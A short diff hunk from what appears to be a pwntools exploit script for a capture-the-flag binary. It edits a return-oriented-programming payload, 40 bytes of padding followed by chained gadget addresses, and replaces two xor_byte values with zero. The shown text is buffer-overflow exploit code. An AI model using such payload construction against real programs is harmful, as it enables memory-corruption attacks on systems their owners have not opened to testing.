@@ -17,8 +17,8 @@ payload =b'A'*40
 payload += p64(gad5)
 payload += p64(flag)
 payload += p64(data)
-payload += p64(xor_byte)
-payload += p64(xor_byte)
+payload += p64(0x00)
+payload += p64(0x00)
 payload += p64(gad4)
 
 
